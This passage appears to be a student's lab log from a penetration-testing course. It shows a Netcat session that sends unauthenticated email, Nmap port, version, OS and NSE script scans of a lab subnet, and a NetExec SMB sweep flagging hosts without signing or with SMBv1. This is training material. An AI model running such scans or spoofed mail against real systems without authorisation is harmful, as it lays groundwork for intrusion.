rcpt to:<bgreen@hiboxy.com>
data
Subject: Test Email

I used Netcat to send an unauthenticated email!

Sincerely,
Your Friendly Neighborhood Pen Tester
.
250 2.1.0 Sender OK
250 2.1.5 Recipient OK
354 Start mail input; end with <CRLF>.<CRLF>
250 2.6.0 <0c963663-38ee-4418-9fdc-54217034cc85@mail01.hiboxy.com> [InternalId=523986010113, Hostname=mail01.hiboxy.com] 1590 bytes in 0.103, 15.038 KB/sec Queued mail for delivery
quit
221 2.0.0 Service closing transmission channel
sec560@560vm:~/Downloads$ 
```

#### 4: Version Scan of .10

```
sec560@560vm:~/Downloads$ sudo nmap -n -F 10.130.10.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:27 UTC
Nmap scan report for 10.130.10.10
Host is up (0.18s latency).
Not shown: 96 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
9100/tcp open  jetdirect

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ sudo nmap -n -sT -F --open 10.130.10.10 -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:28 UTC
Nmap scan report for 10.130.10.10
Host is up (0.17s latency).
Not shown: 96 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
23/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       nginx 1.24.0 (Ubuntu)
9100/tcp open  jetdirect?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.64 seconds
sec560@560vm:~/Downloads$ 

```

#### 4: Version Scan of .10

```
sec560@560vm:~/Downloads$ head /usr/share/nmap/scripts/script.db
Entry { filename = "acarsd-info.nse", categories = { "discovery", "safe", } }
Entry { filename = "address-info.nse", categories = { "default", "safe", } }
Entry { filename = "afp-brute.nse", categories = { "brute", "intrusive", } }
Entry { filename = "afp-ls.nse", categories = { "discovery", "safe", } }
Entry { filename = "afp-path-vuln.nse", categories = { "exploit", "intrusive", "vuln", } }
Entry { filename = "afp-serverinfo.nse", categories = { "default", "discovery", "safe", } }
Entry { filename = "afp-showmount.nse", categories = { "discovery", "safe", } }
Entry { filename = "ajp-auth.nse", categories = { "auth", "default", "safe", } }
Entry { filename = "ajp-brute.nse", categories = { "brute", "intrusive", } }
Entry { filename = "ajp-headers.nse", categories = { "discovery", "safe", } }
sec560@560vm:~/Downloads$
```

```
sec560@560vm:~/Downloads$ wc -l /usr/share/nmap/scripts/script.db
605 /usr/share/nmap/scripts/script.db
sec560@560vm:~/Downloads$
```

```
sec560@560vm:~/Downloads$ grep safe /usr/share/nmap/scripts/script.db | wc -l
grep discovery /usr/share/nmap/scripts/script.db | wc -l
grep intrusive /usr/share/nmap/scripts/script.db | wc -l
348
310
213
sec560@560vm:~/Downloads$ 
```

#### 6: The ssh-auth-methods Script

```
sec560@560vm:~/Downloads$ sudo nmap -n --open -F --script=ssh-auth-methods 10.130.10.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:31 UTC
Nmap scan report for 10.130.10.10
Host is up (0.18s latency).
Not shown: 96 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
23/tcp   open  telnet
80/tcp   open  http
9100/tcp open  jetdirect

Nmap done: 1 IP address (1 host up) scanned in 1.96 seconds
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ nc -nv -w 1 10.130.10.10 23
(UNKNOWN) [10.130.10.10] 23 (telnet) open
SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
^C
sec560@560vm:~/Downloads$ 
```

#### 7: Examining the ssh-auth-methods Script

```
sec560@560vm:~/Downloads$ sudo nmap -n --open -F --script=ssh-auth-methods 10.130.10.10 -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:33 UTC
Nmap scan report for 10.130.10.10
Host is up (0.18s latency).
Not shown: 96 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
23/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
80/tcp   open  http       nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
9100/tcp open  jetdirect?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.03 seconds
sec560@560vm:~/Downloads$ 
```

#### 8: SMB Scripts

```
sec560@560vm:~/Downloads$ ls /usr/share/nmap/scripts/smb*.nse
/usr/share/nmap/scripts/smb2-capabilities.nse
/usr/share/nmap/scripts/smb2-security-mode.nse
/usr/share/nmap/scripts/smb2-time.nse
/usr/share/nmap/scripts/smb2-vuln-uptime.nse
/usr/share/nmap/scripts/smb-brute.nse
/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse
/usr/share/nmap/scripts/smb-enum-domains.nse
/usr/share/nmap/scripts/smb-enum-groups.nse
/usr/share/nmap/scripts/smb-enum-processes.nse
/usr/share/nmap/scripts/smb-enum-services.nse
/usr/share/nmap/scripts/smb-enum-sessions.nse
/usr/share/nmap/scripts/smb-enum-shares.nse
/usr/share/nmap/scripts/smb-enum-users.nse
/usr/share/nmap/scripts/smb-flood.nse
/usr/share/nmap/scripts/smb-ls.nse
/usr/share/nmap/scripts/smb-mbenum.nse
/usr/share/nmap/scripts/smb-os-discovery.nse
/usr/share/nmap/scripts/smb-print-text.nse
/usr/share/nmap/scripts/smb-protocols.nse
/usr/share/nmap/scripts/smb-psexec.nse
/usr/share/nmap/scripts/smb-security-mode.nse
/usr/share/nmap/scripts/smb-server-stats.nse
/usr/share/nmap/scripts/smb-system-info.nse
/usr/share/nmap/scripts/smb-vuln-conficker.nse
/usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
/usr/share/nmap/scripts/smb-vuln-cve-2017-7494.nse
/usr/share/nmap/scripts/smb-vuln-ms06-025.nse
/usr/share/nmap/scripts/smb-vuln-ms07-029.nse
/usr/share/nmap/scripts/smb-vuln-ms08-067.nse
/usr/share/nmap/scripts/smb-vuln-ms10-054.nse
/usr/share/nmap/scripts/smb-vuln-ms10-061.nse
/usr/share/nmap/scripts/smb-vuln-ms17-010.nse
/usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
/usr/share/nmap/scripts/smb-vuln-webexec.nse
/usr/share/nmap/scripts/smb-webexec-exploit.nse
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ grep -l smb-brute /usr/share/nmap/scripts/smb*
/usr/share/nmap/scripts/smb-brute.nse
/usr/share/nmap/scripts/smb-enum-domains.nse
/usr/share/nmap/scripts/smb-enum-groups.nse
/usr/share/nmap/scripts/smb-enum-processes.nse
/usr/share/nmap/scripts/smb-enum-sessions.nse
/usr/share/nmap/scripts/smb-enum-shares.nse
/usr/share/nmap/scripts/smb-enum-users.nse
/usr/share/nmap/scripts/smb-flood.nse
/usr/share/nmap/scripts/smb-os-discovery.nse
/usr/share/nmap/scripts/smb-psexec.nse
/usr/share/nmap/scripts/smb-security-mode.nse
/usr/share/nmap/scripts/smb-server-stats.nse
/usr/share/nmap/scripts/smb-system-info.nse
/usr/share/nmap/scripts/smb-vuln-conficker.nse
/usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
/usr/share/nmap/scripts/smb-vuln-cve-2017-7494.nse
/usr/share/nmap/scripts/smb-vuln-ms06-025.nse
/usr/share/nmap/scripts/smb-vuln-ms07-029.nse
/usr/share/nmap/scripts/smb-vuln-ms08-067.nse
/usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ grep -L smb-brute /usr/share/nmap/scripts/smb*
/usr/share/nmap/scripts/smb2-capabilities.nse
/usr/share/nmap/scripts/smb2-security-mode.nse
/usr/share/nmap/scripts/smb2-time.nse
/usr/share/nmap/scripts/smb2-vuln-uptime.nse
/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse
/usr/share/nmap/scripts/smb-enum-services.nse
/usr/share/nmap/scripts/smb-ls.nse
/usr/share/nmap/scripts/smb-mbenum.nse
/usr/share/nmap/scripts/smb-print-text.nse
/usr/share/nmap/scripts/smb-protocols.nse
/usr/share/nmap/scripts/smb-vuln-ms10-054.nse
/usr/share/nmap/scripts/smb-vuln-ms10-061.nse
/usr/share/nmap/scripts/smb-vuln-ms17-010.nse
/usr/share/nmap/scripts/smb-vuln-webexec.nse
/usr/share/nmap/scripts/smb-webexec-exploit.nse
sec560@560vm:~/Downloads$ 
```

`--script-args=smbuser=ADMIN_USER,smbpass=ADMIN_PASSWORD,config=CONFIG_FILE_NAME`

#### 9: The smb2-security-mode Script

```
sec560@560vm:~/Downloads$ sudo nmap -n -PS445 -p 445 --script=smb2-security-mode --open 10.130.10.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:36 UTC
Nmap scan report for 10.130.10.4
Host is up (0.17s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Nmap scan report for 10.130.10.5
Host is up (0.17s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap scan report for 10.130.10.7
Host is up (0.17s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap scan report for 10.130.10.21
Host is up (0.18s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap scan report for 10.130.10.23
Host is up (0.16s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap scan report for 10.130.10.25
Host is up (0.17s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Nmap scan report for 10.130.10.44
Host is up (0.16s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 256 IP addresses (10 hosts up) scanned in 12.73 seconds
sec560@560vm:~/Downloads$ 

```

#### 10: The smb-protocols Script

```
sec560@560vm:~/Downloads$ sudo nmap -n -PS445 -p 445 --open --script=smb-protocols 10.130.10.4,44
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:37 UTC
Nmap scan report for 10.130.10.4
Host is up (0.16s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1

Nmap scan report for 10.130.10.44
Host is up (0.16s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1

Nmap done: 2 IP addresses (2 hosts up) scanned in 14.40 seconds
sec560@560vm:~/Downloads$ 
```

#### 11: OS Fingerprinting

```
sec560@560vm:~/Downloads$ sudo nmap -n -F -O 10.130.10.4,10,44
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:38 UTC
Nmap scan report for 10.130.10.4
Host is up (0.16s latency).
Not shown: 93 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host

Nmap scan report for 10.130.10.10
Host is up (0.16s latency).
Not shown: 96 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
9100/tcp open  jetdirect
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/6%OT=22%CT=7%CU=43484%PV=Y%DS=2%DC=I%G=Y%TM=69AA3
OS:E36%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M551ST11NWA%O2=M551ST11NWA
OS:%O3=M551NNT11NWA%O4=M551ST11NWA%O5=M551ST11NWA%O6=M551ST11)WIN(W1=F4B3%W
OS:2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M551NN
OS:SNWA%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops

Nmap scan report for 10.130.10.44
Host is up (0.16s latency).
Not shown: 96 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 17.71 seconds
sec560@560vm:~/Downloads$ 

```

```
sec560@560vm:~/Downloads$ sudo nmap -n -p 445 --open --script=smb-os-discovery.nse 10.130.10.4,44
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:39 UTC
Nmap scan report for 10.130.10.4
Host is up (0.16s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.130.10.44
Host is up (0.16s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2022 Datacenter 20348 (Windows Server 2022 Datacenter 6.3)
|   Computer name: file01
|   NetBIOS computer name: FILE01\x00
|   Domain name: hiboxy.com
|   Forest name: hiboxy.com
|   FQDN: file01.hiboxy.com
|_  System time: 2026-03-06T02:39:24+00:00

Nmap done: 2 IP addresses (2 hosts up) scanned in 5.21 seconds
sec560@560vm:~/Downloads$ 

```

```
sec560@560vm:~/Downloads$ sudo nmap -n -p 445 --open --script=smb-os-discovery.nse 10.130.10.4,44 -d
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:39 UTC
--------------- Timing report ---------------
  hostgroups: min 1, max 100000
  rtt-timeouts: init 1000, min 100, max 10000
  max-scan-delay: TCP 1000, UDP 1000, SCTP 1000
  parallelism: min 0, max 0
  max-retries: 10, host-timeout: 0
  min-rate: 0, max-rate: 0
---------------------------------------------
NSE: Using Lua 5.4.
NSE: Arguments from CLI: 
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 02:39
Completed NSE at 02:39, 0.00s elapsed
Initiating Ping Scan at 02:39
Scanning 2 hosts [4 ports/host]
Packet capture filter (device tun0): dst host 10.254.252.58 and (icmp or icmp6 or ((tcp) and (src host 10.130.10.4 or src host 10.130.10.44)))
We got a ping packet back from 10.130.10.44: id = 2161 seq = 0 checksum = 63374
We got a ping packet back from 10.130.10.4: id = 35742 seq = 0 checksum = 29793
Completed Ping Scan at 02:39, 0.18s elapsed (2 total hosts)
Overall sending rates: 45.17 packets / s, 1716.56 bytes / s.
Initiating SYN Stealth Scan at 02:39
Scanning 2 hosts [1 port/host]
Packet capture filter (device tun0): dst host 10.254.252.58 and (icmp or icmp6 or ((tcp) and (src host 10.130.10.4 or src host 10.130.10.44)))
Discovered open port 445/tcp on 10.130.10.44
Discovered open port 445/tcp on 10.130.10.4
Completed SYN Stealth Scan at 02:39, 0.17s elapsed (2 total ports)
Overall sending rates: 11.46 packets / s, 504.35 bytes / s.
NSE: Script scanning 2 hosts.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 02:39
NSE: Starting smb-os-discovery against 10.130.10.4.
NSE: Starting smb-os-discovery against 10.130.10.44.
NSE: [smb-os-discovery 10.130.10.4] SMB: Added account '' to account list
NSE: [smb-os-discovery 10.130.10.4] SMB: Added account 'guest' to account list
NSE: [smb-os-discovery 10.130.10.4] Couldn't negotiate a SMBv1 connection:SMB: Failed to receive bytes: ERROR
NSE: Finished smb-os-discovery against 10.130.10.4.
NSE: [smb-os-discovery 10.130.10.44] SMB: Added account '' to account list
NSE: [smb-os-discovery 10.130.10.44] SMB: Added account 'guest' to account list
NSE: [smb-os-discovery 10.130.10.44] SMB: Login as \guest failed (NT_STATUS_ACCOUNT_DISABLED)
NSE: Finished smb-os-discovery against 10.130.10.44.
Completed NSE at 02:40, 4.81s elapsed
Nmap scan report for 10.130.10.4
Host is up, received echo-reply ttl 127 (0.16s latency).
Scanned at 2026-03-06 02:39:55 UTC for 2s

PORT    STATE SERVICE      REASON
445/tcp open  microsoft-ds syn-ack ttl 127

Host script results:
| smb-os-discovery: 
|_  ERROR: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
Final times for host: srtt: 163658 rttvar: 122784  to: 654794

Nmap scan report for 10.130.10.44
Host is up, received echo-reply ttl 127 (0.16s latency).
Scanned at 2026-03-06 02:39:55 UTC for 5s

PORT    STATE SERVICE      REASON
445/tcp open  microsoft-ds syn-ack ttl 127

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2022 Datacenter 20348 (Windows Server 2022 Datacenter 6.3)
|   Computer name: file01
|   NetBIOS computer name: FILE01\x00
|   Domain name: hiboxy.com
|   Forest name: hiboxy.com
|   FQDN: file01.hiboxy.com
|_  System time: 2026-03-06T02:39:58+00:00
Final times for host: srtt: 163011 rttvar: 122302  to: 652219

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 02:40
Completed NSE at 02:40, 0.00s elapsed
Read from /usr/bin/../share/nmap: nmap-protocols nmap-services.
Nmap done: 2 IP addresses (2 hosts up) scanned in 5.22 seconds
           Raw packets sent: 10 (392B) | Rcvd: 4 (144B)
sec560@560vm:~/Downloads$ 

```

#### 12: Better OS Fingerprinting Techniques

```
sec560@560vm:~/Downloads$ ls -1 /usr/share/nmap/scripts/*ntlm*
/usr/share/nmap/scripts/http-ntlm-info.nse
/usr/share/nmap/scripts/imap-ntlm-info.nse
/usr/share/nmap/scripts/ms-sql-ntlm-info.nse
/usr/share/nmap/scripts/nntp-ntlm-info.nse
/usr/share/nmap/scripts/pop3-ntlm-info.nse
/usr/share/nmap/scripts/rdp-ntlm-info.nse
/usr/share/nmap/scripts/smtp-ntlm-info.nse
/usr/share/nmap/scripts/telnet-ntlm-info.nse
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ sudo nmap -n -PS3389 -p 3389 --open 10.130.10.4,44 --script rdp-ntlm-info
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:42 UTC
Nmap scan report for 10.130.10.4
Host is up (0.16s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: HIBOXY
|   NetBIOS_Domain_Name: HIBOXY
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hiboxy.com
|   DNS_Computer_Name: dc01.hiboxy.com
|   DNS_Tree_Name: hiboxy.com
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-06T02:42:14+00:00

Nmap scan report for 10.130.10.44
Host is up (0.16s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: HIBOXY
|   NetBIOS_Domain_Name: HIBOXY
|   NetBIOS_Computer_Name: FILE01
|   DNS_Domain_Name: hiboxy.com
|   DNS_Computer_Name: file01.hiboxy.com
|   DNS_Tree_Name: hiboxy.com
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-06T02:42:14+00:00

Nmap done: 2 IP addresses (2 hosts up) scanned in 1.24 seconds
sec560@560vm:~/Downloads$ 
```

`https://learn.microsoft.com/en-us/windows/release-health/windows-server-release-info`

`Product_Version: 10.0.20348`

```
sec560@560vm:~/Downloads$ nmap -n -PS445 -p 445 10.130.10.0/24 --open -oG - | awk '/445.open/ { print $2 }' |tee 445.tcp
10.130.10.4
10.130.10.5
10.130.10.7
10.130.10.21
10.130.10.23
10.130.10.25
10.130.10.44
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ nxc smb 445.tcp
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating missing folder logs/sam
[*] Creating missing folder logs/lsa
[*] Creating missing folder logs/ntds
[*] Creating missing folder logs/dpapi
[*] Creating default workspace
[*] Initializing RDP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing VNC protocol database
[*] Initializing WINRM protocol database
[*] Initializing WMI protocol database
[*] Initializing FTP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing NFS protocol database
[*] Initializing LDAP protocol database
[*] Copying default configuration file
SMB         10.130.10.7     445    CA01             [*] Windows Server 2022 Build 20348 x64 (name:CA01) (domain:hiboxy.com) (signing:False) (SMBv1:False)
SMB         10.130.10.25    445    MAIL01           [*] Windows Server 2022 Build 20348 x64 (name:MAIL01) (domain:hiboxy.com) (signing:True) (SMBv1:False)
SMB         10.130.10.23    445    RDP01            [*] Windows Server 2022 Build 20348 x64 (name:RDP01) (domain:hiboxy.com) (signing:False) (SMBv1:False)
SMB         10.130.10.44    445    FILE01           [*] Windows Server 2022 Build 20348 x64 (name:FILE01) (domain:hiboxy.com) (signing:False) (SMBv1:True)
SMB         10.130.10.21    445    JUMP01           [*] Windows Server 2022 Build 20348 x64 (name:JUMP01) (domain:hiboxy.com) (signing:False) (SMBv1:False)
SMB         10.130.10.4     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hiboxy.com) (signing:True) (SMBv1:False)
SMB         10.130.10.5     445    WEB01            [*] Windows Server 2022 Build 20348 (name:WEB01) (domain:hiboxy.com) (signing:False) (SMBv1:False)
Running nxc against 7 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
sec560@560vm:~/Downloads$ 
```

#### 13: HTTP NSE Scripts

```
sec560@560vm:~/Downloads$ sudo nmap -v -p*http* -oG -
# Nmap 7.94SVN scan initiated Fri Mar  6 02:44:59 2026 as: nmap -v -p*http* -oG -
# Ports scanned: TCP(63;80,280,443,488,591,593,623,777,808,832,1183-1184,2381,2688,2851,3106,3128,3227,3816,4035-4036,4180,4848-4849,5554,5800-5803,5988-5990,6443,6480,6770-6771,6788,6842,7443,7627,7677,8000,8008,8080,8088,8243,8280,8443-8444,8765,8910,8990-8991,9294-9295,9443,9762,16992-16993,20002-20003,24680,27504) UDP(0;) SCTP(0;) PROTOCOLS(0;)
WARNING: No targets were specified, so 0 hosts scanned.
# Nmap done at Fri Mar  6 02:44:59 2026 -- 0 IP addresses (0 hosts up) scanned in 0.01 seconds
sec560@560vm:~/Downloads$ 
```

```
ec560@560vm:~/Downloads$ sudo nmap -n -p*http* --open 10.130.10.0/24 --script reverse-index --max-retries 0
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:45 UTC
Warning: 10.130.10.1 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.2 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.3 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.8 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.9 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.13 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.14 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.15 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.16 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.17 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.18 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.19 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.20 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.24 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.27 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.28 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.29 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.30 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.31 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.32 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.36 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.37 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.38 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.39 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.40 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.41 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.42 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.43 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.46 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.49 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.50 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.51 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.52 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.53 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.54 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.57 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.58 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.59 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.60 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.61 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.62 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.65 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.66 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.67 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.68 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.69 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.70 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.71 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.72 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.75 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.78 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.79 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.80 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.81 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.82 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.83 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.86 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.87 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.88 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.89 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.90 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.91 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.94 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.95 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.96 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.97 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.98 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.99 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.100 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.101 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.104 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.107 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.108 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.109 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.110 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.111 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.112 giving up on port because retransmission cap hit (0).
